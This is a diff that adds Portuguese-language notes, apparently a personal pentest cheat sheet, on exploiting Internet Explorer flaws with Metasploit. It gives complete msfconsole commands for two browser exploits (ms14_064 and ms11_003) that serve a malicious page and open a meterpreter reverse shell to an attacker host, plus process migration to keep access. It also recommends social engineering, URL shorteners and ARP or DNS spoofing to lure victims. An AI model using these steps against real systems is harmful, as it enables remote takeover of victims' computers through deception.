@@ -1,0 +1,68 @@
+Verificar falhas em Windows Explorer:
+
+No msfconsole:
+grep -i "internet explorer" search exploit/windows/browser
+
+Verificar as informações do exploit selecionado (versões vulneraveis e Windows vulneraveis):
+info exploit/windows/browser/ms14_064_code_execution
+
+###Esse payload abre uma conexão Web, portanto pode-se parar o apache se estiver rodando localmente, para que o payload inicie um serviço na porta 80 sem conflitos
+###O exploit em questão pode ser usado desde windows 2000 ao windows 10
+
+Setar o SRVHOST (Que sera o servidor - Atacante)
+set SRVHOST 192.168.1.20
+
+Setar a porta do servidor Web:
+set SRVPORT 80
+
+Setar o diretorio de acesso (Ex: http://192.168.1.20/videos)
+set URIPATH videos
+
+###Nesse exploit, ha uma opção para setar o SSL, para paginas e browsers que aceitam apenas conexão SSL
+
+Setar o payload meterpreter
+set PAYLOAD windows/meterpreter/reverse_tcp
+
+Setar as opções do PAYLOAD:
+set LPORT 4000
+set LHOST 192.168.1.20
+
+Começar o exploit (Irá habilitar o servidor Web):
+exploit
+
+###Usar engenharia sossial para vitima abrir o site, seja por compactador de URL, como goo.gl, ou outra ferramenta como ARPSPOOF ou DNSSPOOF
+
+O Payload rodará em background, e quando a vitima acessar a sessão meterpreter será aberta e poderemos usar o "sessions -l" para visualizar.
+============================================
+
+Teste de falha de browser e css em Windows 7
+
+Usar o exploit
+use exploit/windows/browser/ms11_003_ie_css_import
+
+Setar as opções SRVHOST, SRVPORT e URIPATH
+
+set SRVHOST 192.168.1.20
+set SRVPORT 80
+set URIPATH videos
+
+Usar o PAYLOAD meterpreter
+set PAYLOAD windows/meterpreter/reverse_tcp
+
+Setar o LPORT e o LHOST do payload:
+set LHOST 192.168.1.20
+set LPORT 4444
+
+Verificar opções de sistema do alvo:
+show targets
+
+Setar o alvo (Windows 7 ou XP - Windows 8 e 10 serao setados como 7)
+set TARGETS 1
+
+OPCIONAL:Setar a opção avançada INITIALAUTORUNSCRIPT para "migrate -f", visando migrar o processo ao conectar evitando perda de conexão.
+set INITIALAUTORUNSCRIPT migrate -f
+    ### O migrate f abre varias conexões, alem de mudar para processos aleatorios, evitando a perda de conexão
+
+Rodar o payload:
+exploit
+
